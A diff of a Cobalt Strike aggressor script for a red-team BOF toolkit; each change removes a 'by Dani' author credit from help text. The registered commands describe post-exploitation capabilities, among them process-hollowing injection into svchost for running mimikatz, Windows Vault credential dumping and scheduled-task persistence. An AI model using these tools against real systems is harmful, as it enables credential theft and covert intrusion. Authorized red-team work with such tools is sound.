-    blog($bid, "  DEF-Situational-Awareness-BOF  //  by Dani");
+    blog($bid, "  DEF-Situational-Awareness-BOF");
     blog($bid, "  157 BOFs across 6 phases  |  Use 'help <cmd>' for full syntax");
     blog($bid, "=================================================================");
     blog($bid, "");
@@ -2986,7 +2986,7 @@ alias dani-help {
     blog($bid, "  force-lock-screen T1531  Lock workstation         [no args]");
     blog($bid, "  enum-web-client T1135    WebClient + proxy        [no args]");
     blog($bid, "");
-    blog($bid, "PHASE 5 — Persistence (2 BOFs, by Dani)");
+    blog($bid, "PHASE 5 — Persistence (2 BOFs)");
     blog($bid, "  schtask-com    T1053.005 Sched task via COM       <name> <cmd> [trig] [rm]");
     blog($bid, "  lnk-startup    T1547.001 Startup LNK via COM      <name> <target> [args] [rm]");
     blog($bid, "");
@@ -3043,7 +3043,7 @@ alias defdump {
 }
 beacon_command_register(
     "defdump",
-    "Process Hollowing PE loader with argument spoofing — T1055.012 (by Dani)",
+    "Process Hollowing PE loader with argument spoofing — T1055.012",
     "Synopsis: defdump <pe_payload_path> [mimikatz_args...]\n\n" .
     "Description: Load a PE binary via Process Hollowing into a suspended\n" .
     "svchost.exe with command-line argument spoofing. The PE payload is\n" .
@@ -3074,7 +3074,7 @@ alias vaultdump {
 }
 beacon_command_register(
     "vaultdump",
-    "Dump Windows Vault credentials — T1555.004 (by Dani)",
+    "Dump Windows Vault credentials — T1555.004",
     "Synopsis: vaultdump [username] [password] [domain]\n\n" .
     "Description: Enumerate Windows Credential Vaults and dump plaintext\n" .
     "passwords. Without args, dumps current context. With credentials,\n" .
@@ -3096,7 +3096,7 @@ alias firewall-rule {
 }
 beacon_command_register(
     "firewall-rule",
-    "Enumerate Windows Firewall rules — T1562.004 (by Dani)",
+    "Enumerate Windows Firewall rules — T1562.004",
     "Synopsis: firewall-rule\n\nDescription: Dump configured firewall rules per profile from the registry.\n\nMITRE ATT&CK: T1562.004 (Disable or Modify System Firewall)\n\nArgs: none"
 );
 
@@ -3106,7 +3106,7 @@ alias ai-surface {
 }
 beacon_command_register(
     "ai-surface",
-    "Inventory AI assistants / local LLM endpoints — T1518 (by Dani)",
+    "Inventory AI assistants / local LLM endpoints — T1518",
     "Synopsis: ai-surface\n\nDescription: Detect installed AI assistants (Copilot, Ollama, LM Studio, etc).\n\nMITRE ATT&CK: T1518 (Software Discovery)\n\nArgs: none"
 );
 
@@ -3116,7 +3116,7 @@ alias amsi-etw-detect {
 }
 beacon_command_register(
     "amsi-etw-detect",
-    "Report AMSI / ETW patch posture — T1518.001 (by Dani)",
+    "Report AMSI / ETW patch posture — T1518.001",
     "Synopsis: amsi-etw-detect\n\nDescription: Inspect amsi.dll!AmsiScanBuffer and ntdll!EtwEventWrite prologues for known patch patterns.\n\nMITRE ATT&CK: T1518.001 (Security Software Discovery)\n\nArgs: none"
 );
 
@@ -3126,7 +3126,7 @@ alias bitlocker-status {
 }
 beacon_command_register(
     "bitlocker-status",
-    "Per-volume BitLocker protection status — T1486/T1005 (by Dani)",
+    "Per-volume BitLocker protection status — T1486/T1005",
     "Synopsis: bitlocker-status\n\nDescription: Query BitLocker protection / encryption status for every fixed volume.\n\nMITRE ATT&CK: T1486 (Data Encrypted for Impact), T1005 (Data from Local System)\n\nArgs: none"
 );
 
@@ -3136,7 +3136,7 @@ alias ide-extension-surface {
 }
 beacon_command_register(
     "ide-extension-surface",
-    "Enumerate VS Code / JetBrains extensions — T1518 (by Dani)",
+    "Enumerate VS Code / JetBrains extensions — T1518",
     "Synopsis: ide-extension-surface\n\nDescription: List installed IDE extensions (publisher, name, version) from per-user profile directories.\n\nMITRE ATT&CK: T1518 (Software Discovery)\n\nArgs: none"
 );
 
@@ -3146,7 +3146,7 @@ alias proxy-enum {
 }
 beacon_command_register(
     "proxy-enum",
-    "Dump WinINet / WinHTTP proxy + PAC config — T1016 (by Dani)",
+    "Dump WinINet / WinHTTP proxy + PAC config — T1016",
     "Synopsis: proxy-enum\n\nDescription: Read system + per-user proxy configuration (auto-detect, PAC URL, bypass list).\n\nMITRE ATT&CK: T1016 (System Network Configuration Discovery)\n\nArgs: none"
 );
 
@@ -3156,6 +3156,6 @@ alias wevt-logon-enum {
 }
 beacon_command_register(
     "wevt-logon-enum",
-    "Query Security event log for recent logons — T1087.001 (by Dani)",
+    "Query Security event log for recent logons — T1087.001",
     "Synopsis: wevt-logon-enum\n\nDescription: Parse Security channel for 4624/4634 events to enumerate local accounts and their last-logon times.\n\nMITRE ATT&CK: T1087.001 (Local Account Discovery)\n\nArgs: none"
 );
